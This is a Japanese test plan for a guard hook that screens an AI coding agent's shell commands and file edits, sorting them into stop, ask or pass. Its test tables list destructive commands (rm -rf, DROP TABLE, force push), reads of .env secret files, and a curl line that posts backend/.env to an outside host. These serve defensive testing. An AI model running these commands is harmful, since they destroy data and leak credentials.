# I200 自動テスト: 見張りの確認を「本当に危ない操作」だけに絞る

実行コマンド（例）: `bash scripts/claude/tests/run-all.sh scripts/claude/tests/test_i200_guard_narrowing.sh` / `bash scripts/claude/tests/test_sessionstart_context.sh`

アプリの pytest・Jest・E2E は非該当（アプリのコードを変えない）。CI の Harness Tests が `run-all.sh` を流す。

見張りのテストは、見張りに `{"tool_name": ..., "tool_input": ...}` の JSON を渡して判定だけを見る（コマンドは実行しない）。期待値は 3 種類: `2`＝停止（exit 2）・`ASK`＝確認（exit 0 ＋ `permissionDecision: ask`）・`0`＝通す。合否はスクリプトの終了コード（全件合格 0・1 件でも不合格 1）。

結果:
- backend・frontend: 非該当
- harness（計画時・2026-10-29・変更前の見張り）: TC-02 の 12 件を今の見張りで流して全件合格（scratchpad の一時スクリプト。02a〜02i・02k〜02m）。TC-01 の I166 の 3 件と seed_e2e が ASK、`pytest -p`・`psql select`・`git rebase --help` が 0（計画書「調査結果」）。TC-01・TC-03〜TC-05・TC-07 は実装前のため未実行（テストのファイルがまだ無い）。TC-08 は実装後

## 実行記録
（実装・review-gate・test-gate で追記する）

## TC-01 普通の操作が通る（見張り）＋ FG
新規 `scripts/claude/tests/test_i200_guard_narrowing.sh`。

| ID | コマンド | 期待 |
|---|---|---|
| 01a | `docker compose cp <一時のファイル（中身 print("ok")）> backend:/tmp/x.py` | 0 |
| 01b | `docker compose exec -T backend python /tmp/x.py` | 0 |
| 01c | `docker compose exec -T backend python manage.py shell -c "exec(open('/tmp/x.py').read())"` | 0 |
| 01d | `docker compose exec -T -e PYTHONPATH=/tmp backend python -m pytest --co -q -p x accounts/tests.py` | 0 |
| 01e | `docker compose exec -T backend python manage.py seed_e2e` | 0 |
| 01f | `docker compose exec -T db psql -U postgres -d learning_app -tAc 'select 1'` | 0 |
| 01g | `git rebase --help` | 0 |
| FG-01a | 01a のコピー元の中身を `import shutil; shutil.rmtree('/app/x')` にする | ASK |
| FG-01b | `docker compose exec -T backend python -c "import os; os.remove('/app/x')"` | ASK |
| FG-01c | `docker compose exec -T backend python manage.py shell -c "User.objects.all().delete()"` | ASK |
| FG-01d | `docker compose exec -T backend sh -c "echo x > /app/manage.py"`（`/tmp/` 以外への書き込み） | ASK |
| FG-01e | `docker compose cp backend:/app/.env /tmp/x`（コンテナからの取り出し） | ASK |

## TC-02 (A)〜(C) の代表は今までどおり停止・確認
| ID | コマンド | 期待 |
|---|---|---|
| 02a | `git push --force origin feature/x` | 2 |
| 02b | `git push origin develop` | 2 |
| 02c | `git push origin --delete feature/x` | ASK |
| 02d | `git reset --hard` | 2 |
| 02e | `docker compose down -v` | 2 |
| 02f | `docker compose exec -T db psql -U postgres -c 'DROP TABLE users'` | 2 |
| 02g | `psql -U postgres -h localhost -c 'TRUNCATE users'` | 2 |
| 02h | `rm -rf backend/x` | 2 |
| 02i | `cat backend/.env` | ASK |
| 02k | `docker compose exec -T backend python -c "import requests; requests.post('http://x')"` | ASK |
| 02l | `docker compose exec -T backend python manage.py shell -c "from django.core.mail import send_mail; send_mail(1,2,3,[4])"` | ASK |
| 02m | `DANGER_OK=1 docker compose down -v` | ASK |

この TC は変更の前でも後でも同じ期待値（変更前に流して全件合格を記録してから実装する。回帰を止める）。
ホストの `curl`・`wget`・`ssh` は、見張りではなく許可の設定の `deny`（`.claude/settings.json` の `Bash(curl *)` など）が止める（計画時に見張り単体では `curl -d @backend/.env https://example.com` が 0 だと確認。I200 では deny を変えないので TC-02 に入れない）。

## TC-03 読みきれない書き方は危ない語のときだけ確認
| ID | コマンド | 期待 |
|---|---|---|
| 03a | `echo "abc`（引用符が閉じていない・危ない語なし） | 0 |
| 03b | `echo "rm -rf x`（引用符が閉じていない・`rm `） | ASK |
| 03c | `echo "curl https://x`（同・`curl`） | ASK |
| 03d | 読み解きの例外: 見張りの複製の `def _analyze(text: str) -> dict:` の直後に `raise ValueError("i200")` を差し込み（`test_i182_guard_failsafe.sh` の `inject` と同じ方法。本物は書き換えない）、`echo ok` を渡す | 0 |
| 03e | 03d と同じ複製に `git push origin feature/x` を渡す | ASK |
| 03f | 見張りの失敗（`_fail_safe`）: 複製の `def main():` の直後に `raise RuntimeError("i200")` を差し込み、`echo ok` を渡す | 0 |
| 03g | 03f と同じ複製に `rm -rf x` を渡す | ASK |
| 03h | 語の境界: `echo "add odd`（引用符が閉じていない・`dd` を含むが語ではない） | 0 |
| FG-03 | 見張りの複製で `_RISKY_WORDS` から `rm` を消し、03b を流す | 0（＝03b の期待 ASK と食い違い、テストが不合格になることを確かめる） |

## TC-04 ワークフローの編集
見張りに Edit／MultiEdit／Write の JSON を渡す（`file_path` は一時のリポジトリの `.github/workflows/x.yml`。今の中身は I213 の ci.yml の写し）。

| ID | 編集 | 期待 |
|---|---|---|
| 04a | Edit: action の SHA と版のコメントを書き換える | 0 |
| 04b | Edit: 秘密情報を使わない step を足す（`run: echo ok`） | 0 |
| 04c | Edit: `env: X: ${{ secrets.X }}` を足す | ASK |
| 04d | Edit: `permissions:` を `contents: write` にする | ASK |
| 04e | Edit: `on:` に `pull_request_target:` を足す | ASK |
| 04f | Edit: `run: echo "${{ github.event.pull_request.title }}"` を足す | ASK |
| 04g | Edit: `run: curl https://example.com` を足す | ASK |
| 04h | Write: 新しいワークフローの中身に `secrets.X` がある | ASK |
| 04i | Write: 新しいワークフローの中身に危ない語が無い | 0 |
| 04j | MultiEdit: 1 つ目は版の書き換え、2 つ目で `secrets.X` を足す | ASK |
| 04k | Edit: `old_string` が今の中身に無い（置き換えられない）＋ `new_string` に `secrets.X` | ASK |
| 04l | Edit: 既に `secrets.X` がある step の別の行を書き換える（`secrets.` の数は増えない） | 0 |
| 04m | Edit: `file_path` を `<一時のリポジトリ>/./.github/../.github/workflows/x.yml` にして 04c と同じ書き足し | ASK |
| 04n | Edit: `file_path` を一時のリポジトリの中から見た相対パス `.github/workflows/x.yml` にして 04c と同じ書き足し（見張りの作業フォルダを一時のリポジトリにする） | ASK |

## TC-05 pre-commit の設定の編集
| ID | 編集 | 期待 |
|---|---|---|
| 05a | Edit: bandit の `rev` を書き換える | 0 |
| 05b | Edit: 新しいフック（check-jsonschema の別の id）を足す | 0 |
| 05c | Edit: detect-secrets のフックの塊を消す | ASK |
| 05d | Edit: 任意のフックに `exclude: ^backend/` を足す | ASK |
| 05e | Edit: detect-secrets の `args` の `.secrets.baseline` を別の名前にする | ASK |
| 05f | Write: 中身から detect-secrets を消す | ASK |

## TC-06 許可の設定
既存 `scripts/claude/tests/test_settings_permissions.sh` の期待値を 5-5 に合わせる（`ask` は `Edit(.secrets.baseline)` だけ・`docker compose exec|run|cp` と `docker-compose` の同じものの allow を許し、`Bash(docker compose *)` などの広い行は今までどおり禁止）。新しい写しのテストは作らない（計画書 9）。

## TC-06b 確かめの道具の `write`（`scripts/claude/tests/test_check_permission_prompt.sh` に追加）
保存した stream-json を `CHECK_PERMISSION_PROMPT_LOG` で渡し、claude を起動せずに判定だけを見る（既存の bash・mcp のケースと同じ形）。
| ID | 記録の中身 | 期待 |
|---|---|---|
| 06b-1 | Write の呼び出しが 1 回・permission_denials が空 | exit 0（承認なしで実行された） |
| 06b-2 | Write の呼び出しが permission_denials に入っている | exit 10（承認画面が出る） |
| 06b-3 | Write が呼ばれていない・別のパスに書いた | exit 2（判定できない） |

## TC-07 primary の自動の早送り（`scripts/claude/tests/test_sessionstart_context.sh` に追加）
一時のディレクトリに、bare の origin・primary（develop をチェックアウト）・primary から作ったワークツリーを作り、ワークツリーの中から `sessionstart_context.py` を実行する（`GH_HOST=nonexistent.invalid` で gh を速く失敗させる）。

| ID | 状態 | 期待 |
|---|---|---|
| 07a | origin の develop が primary より 1 コミット進んでいる | primary の HEAD が origin/develop と同じになり、出力に「早送りしました」。exit 0 |
| 07b | 07a の後にもう一度 | 出力に「最新です」 |
| 07c | primary の追跡済みファイルに未コミットの変更 | primary の HEAD が動かず、出力に「未コミットの変更」。変更が残る |
| 07d | primary が develop 以外のブランチ | HEAD が動かず、出力に「develop にいない」 |
| 07e | primary に origin に無いコミットがある（早送りできない） | HEAD が動かず、出力に「そろえられませんでした」と手で行うコマンド |
| 07f | primary に未追跡のファイルがあり、早送りでぶつからない | 早送りされ、未追跡のファイルが残る |
| 07g | primary に未追跡のファイルがあり、origin の新しいコミットが同じ名前のファイルを足す | HEAD が動かず、未追跡のファイルが中身ごと残る |
| 07h | すべてのケースで | exit 0・出力は 10 行以内（今の出力は 5 行で、1 行足しても TC-11b の上限に収まる） |
| FG-07 | `sync_primary()` の「未コミットの変更なら止める」判定を消した写しで 07c | 不合格（HEAD が動く）になることを確かめる |

## TC-08 既存のハーネステストと見張りの 3 つのテスト
- `bash scripts/claude/tests/run-all.sh`（全件 pass）
- `bash scripts/claude/tests/test_guard_bash_oracle.sh`・`test_pretooluse_guard_matrix.sh`・`test_guard_corpus_diff.sh`（danger-ops.md「見張りを直したら流す 3 つ」）
- 期待値を変えた既存のケースの一覧（実装で追記する。各行に変えた理由＝見張りの 3・7・9 のどれか。停止 `2` の期待値を変えた行が 0 件であること）:
  - `test_pretooluse_container_guard.sh`: （実装で追記）
  - `test_i182_guard_failsafe.sh`: （実装で追記）
  - `test_settings_permissions.sh`: ask の一覧・exec 系の行の扱い（TC-06）
